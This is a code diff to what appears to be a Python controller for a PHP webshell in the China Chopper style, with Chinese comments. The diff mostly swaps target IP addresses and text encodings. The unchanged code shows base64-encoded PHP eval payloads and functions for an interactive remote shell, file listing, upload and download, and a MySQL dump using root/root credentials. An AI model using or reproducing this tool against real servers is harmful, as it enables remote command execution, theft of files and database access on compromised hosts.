@@ -10,6 +10,7 @@ import re,os,sys
 import requests
 import base64
 import urllib3
+import requests
 from cmd import Cmd
 from urllib import request
 from urllib.parse import urlencode,quote_plus
@@ -18,9 +19,8 @@ logging.getLogger("urllib3").setLevel(logging.WARNING)
 
 prompt = "root@python># "
 lujing=[]
-# url = 'http://172.28.100.76/3.php'
-url = 'http://10.1.1.100/1.php'
-
+url = 'http://172.28.100.150/1.php'
+# url = 'http://172.28.100.99/xoop/uploads/1.php'
 
 # requests方法
 def post(url, data):
@@ -34,7 +34,7 @@ def oldpost(url, data):
 	response = request.Request(url, data, headers=headers)
 	html = request.urlopen(response).read()
 	try:
-		data = html.decode(encoding='gbk')
+		data = html.decode(encoding='utf-8')
 	except Exception as e:
 		data = html.decode()
 	return data
@@ -55,7 +55,7 @@ def GetCurrentPath():
 	&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtA \
 	c2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOztlY2hvIGRpcm5hbW \
 	UoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTs7ZWNobygifDwtIik7ZGllKCk7'
-	
+
 	response = request.Request(url, code, headers=headers)
 	html = request.urlopen(response).read()
 	data = html.decode()
@@ -64,7 +64,7 @@ def GetCurrentPath():
 	data = RegexFindPath(r'C:(.*?)\|',data)
 
 	data = ''.join(data)
-	
+
 	lujing.append(data)
 
 	# leng = len(lujing)
@@ -114,12 +114,13 @@ def DoShell():
 			current_path.append(data)
 			current_path = ''.join(current_path)
 			print ('切换的路径: {}'.format(current_path[:]))
-		else:        
+		else:
 			print (response)
 # 查看文件
 def ShowFile():
 	# url = raw_input('Pls input url:')
-	url = 'http://172.28.100.76/1.php'
+	url = 'http://172.28.100.150/1.php'
+    # url = r'http://172.28.100.99/xoop/uploads/1.php'
 	# sitepath = raw_input('Pls input sitepath:')
 	sitepath = 'c:\\'
 	# shellpass只需要url编码
@@ -147,7 +148,7 @@ def ShowFile():
 def UploadFile():
 	print (r'例如：c:\phpStudy\WWW\\')
 	upload_file_path = input(r'Please input path: ')
-	
+
 	uploadfile = input('Please upload file: ')
 	shellpass = b'shellpass=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B'
 	z0 = b'&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTt\
@@ -177,7 +178,7 @@ def DownloadFile():
 	vdGVzX2dwYygpP3N0cmlwc2xhc2hlcygkX1BPU1RbInoxIl0pOiRfUE9TVFsiejEiXTskZnA9QGZvc\
 	GVuKCRGLCJyIik7aWYoQGZnZXRjKCRmcCkpe0BmY2xvc2UoJGZwKTtAcmVhZGZpbGUoJEYpO31lbHN\
 	le2VjaG8oIkVSUk9SOi8vIENhbiBOb3QgUmVhZCIpO307ZWNobygifDwtIik7ZGllKCk7'
-	
+
 	z1 = '{0}{1}'.format(download_file_path,downloadfile)
 	print (z1)
 	z1 = b'&z1=' + bytes(z1,encoding='utf8')
@@ -203,7 +204,7 @@ def ShowDB():
 	HJzPUBteXNxbF9mZXRjaF9yb3coJHEpKXtlY2hvKHRyaW0oJHJzWzBdKS5jaHIoOSkpO31AbXlzcWx\
 	fY2xvc2UoJFQpOztlY2hvKCJ8PC0iKTtkaWUoKTs%3D'
 	z1_3 = b'&z1=localhost&z2=root&z3=root'
-	
+
 	post_data = shellpass + z0 + z1_3
 
 	response = oldpost(url,post_data)
@@ -266,7 +267,7 @@ def DosShell():
 			current_path.append(data)
 			current_path = ''.join(current_path)
 			print ('切换的路径: {}'.format(current_path[:]))
-		else:        
+		else:
 			print (response)
 
 
